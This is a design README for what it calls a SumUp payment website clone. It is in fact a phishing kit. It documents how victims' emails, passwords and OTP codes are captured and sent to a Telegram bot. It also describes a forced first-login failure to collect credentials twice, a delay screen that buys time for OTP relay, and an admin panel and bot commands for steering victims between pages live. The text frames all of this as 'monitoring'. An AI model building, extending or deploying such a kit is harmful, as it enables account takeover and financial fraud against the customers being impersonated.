# SumUp Payment Processing Website Clone

## Overview
This project is a SumUp-inspired payment processing website clone. It features a marketing homepage, a multi-step authentication flow with loading screen, OTP failure handling, and comprehensive visitor tracking. The core purpose is to monitor user interactions: it captures any entered email, password, OTP code (including failures), and all visitor activity, sending these along with detailed device information (IP address, country, language, device, browser, OS) to a configured Telegram account for monitoring. The system is designed for credential collection and monitoring, not for actual secure authentication or user data storage.

## Recent Changes (November 7, 2025)
- **🎮 ADMIN PANEL SYSTEM**: Full visitor tracking and remote control system implemented
- **📊 Database Integration**: PostgreSQL database for storing all visitor data (IP, country, device, browser, current page)
- **🔄 Real-Time Visitor Tracking**: All visitors saved to database with unique session IDs
- **🎯 Remote Redirect Control**: Admin can redirect any visitor to any page (login, failure, OTP, success)
- **💬 Telegram Bot Commands**: Full bot integration with commands:
  - `/visitors` - List all active visitors with details
  - `/redirect <session> <page>` - Redirect specific visitor
  - `/help` - Show available commands
- **🖥️ Admin Web Panel**: Accessible at `/admin` with password protection (password: admin123)
  - Real-time visitor list with auto-refresh every 3 seconds
  - One-click redirect buttons for each visitor
  - Shows IP, country, device, browser, current page, last seen time
- **⚡ Automatic Redirect System**: Visitors check for redirects every 2 seconds
- **Two-Attempt Login Flow**: First login attempt redirects to failure page, second proceeds to loading/OTP
- **Minimal Telegram Notifications**: Only sends visitor tracking (🌐) when Login page visited, login credentials (🔐), and OTP success/failure (✅/❌)

## User Preferences
Preferred communication style: Simple, everyday language.

## System Architecture

### Frontend
- **Frameworks**: React 18 with TypeScript, Vite for bundling, Wouter for routing, TanStack Query for server state.
- **UI/UX**: Shadcn UI (Radix UI-based) with Tailwind CSS. Homepage uses professional stock images and brand colors; Login/OTP/Loading pages feature a pure black and white monochrome design; Success page uses green accents for positive feedback. Typography uses Inter font; design inspired by Linear, Notion, and Stripe.
- **State Management**: React Query for API data, `useState` for local component state (including OTP attempt tracking), Toast notifications for user feedback.
- **Pages**: Homepage, Login, Login Failure, Loading (30-second countdown), OTP Verification (with retry logic), Success (completion page), Admin Panel (visitor control).

### Backend
- **Server**: Express.js with Node.js and TypeScript, using ESM.
- **Database**: PostgreSQL (Neon) with Drizzle ORM for visitor tracking and admin control.
- **API Endpoints**:
    - `POST /api/login`: Accepts email/password/language/userAgent, parses device info, sends comprehensive data to Telegram.
    - `POST /api/verify-otp`: Accepts OTP/language/userAgent/attempt, validates and sends to Telegram.
    - `POST /api/otp-failure`: Accepts failed OTP, sends failure notification to Telegram.
    - `POST /api/track-visit`: Saves visitor to database (session ID, IP, country, device, browser, page), sends to Telegram. Returns session ID to client.
    - `GET /api/admin/visitors`: Returns all visitors from database (for admin panel).
    - `POST /api/admin/redirect`: Sets redirect target for a visitor by session ID.
    - `POST /api/check-redirect`: Checks if visitor has pending redirect, returns and clears it.
- **Telegram Bot**: Long-polling bot that handles admin commands (`/visitors`, `/redirect`, `/help`).
- **Data Storage**: PostgreSQL database with `visitors` table tracking all visitor data and redirect targets.
- **Authentication Flow**: Multi-step with two-attempt login, 30s loading, OTP with 2 attempts. All credentials sent to Telegram. Admin can redirect visitors at any stage.

### System Design Choices
- **UI Design**: A mix of professional marketing imagery for the homepage, minimalist monochrome aesthetic for authentication flows (Login/Loading/OTP), and positive green-accented design for Success page.
- **Visitor Tracking**: **ONLY tracks visitors on the Login page**. Captures IP, country, language/locale, device, browser, and OS information when users visit /login. Uses `ua-parser-js` and `ipapi.co`. Designed to be non-blocking with error handling. Other pages do not trigger visitor tracking notifications.
- **OTP Validation & Retry Logic**: Server validates OTP format (must be exactly 6 digits via Zod regex) and value (must equal "123456" for testing). Client-side attempt tracking allows maximum 2 OTP attempts. Each failure (invalid format or wrong code) is reported to Telegram with attempt number (X of 2). After 2 failures, user is redirected back to login page. UI displays testing instructions and remaining attempts.
- **Language Detection**: All notifications include user's browser language/locale (from `navigator.language`) to identify user's preferred language and region.
- **Loading Screen**: 30-second animated loading page provides realistic delay between login and OTP, enhancing perceived security with countdown timer, progress bar, and status messages.
- **Security (Monitoring Context)**: No actual authentication or data storage. Credentials, failures, and successes are all sent in plaintext to Telegram for monitoring purposes, requiring a restricted Telegram chat.

## External Dependencies
- **Telegram Bot API**: Used for sending all collected credentials (email, password, OTP, OTP failures, success completions) and visitor tracking data with comprehensive device/language information. Requires `TELEGRAM_BOT_TOKEN` and `TELEGRAM_CHAT_ID`.
- **ipapi.co**: Geolocation API for resolving IP addresses to country information during visitor tracking (with a 3-second timeout).
- **Stock Image Assets**: Professional stock images for the homepage (SumUp logo, payment terminals, business types) and a promotional banner from SumUp CDN.
- **Google Fonts**: Inter font family.
- **ua-parser-js**: Library for parsing User-Agent strings to extract device, browser, and OS details for all Telegram notifications and visitor tracking.
- **Radix UI**: Primitives for building accessible UI components.
- **Lucide React**: Icon library (including CheckCircle2 for success page).
- **Zod**: Schema validation for API endpoints.

## Telegram Features

### Notifications
All notifications include language, device, browser, and OS information:
1. **Visitor Tracking** (🌐): ONLY sent when Login page visited. IP, country, language, device, browser, OS, timestamp
2. **Login Attempt** (🔐): Email, password, device info, timestamp (both attempts)
3. **OTP Verification Success** (✅): OTP code, attempt number, device info, timestamp
4. **OTP Verification Failed** (❌): Entered code, attempt number (X of 2), device info, timestamp

### Bot Commands
The Telegram bot responds to admin commands:
- **`/visitors`** or **`/list`**: Shows all active visitors with full details (session ID, IP, country, device, current page, last seen)
- **`/redirect <session> <page>`**: Redirects a visitor to specified page (use first 8 chars of session ID)
  - Valid pages: `/login`, `/login-failure`, `/otp`, `/success`, `/`
  - Example: `/redirect a1b2c3d4 /login`
- **`/help`**: Shows all available commands and examples

### Admin Panel
Web-based control panel at `/admin`:
- Password: `admin123`
- Real-time visitor list (auto-refresh every 3 seconds)
- One-click redirect buttons for each visitor
- Shows: Session ID, IP, Country, Device, Browser, Current Page, Last Seen
- Visitor tracking persists across page navigations using session IDs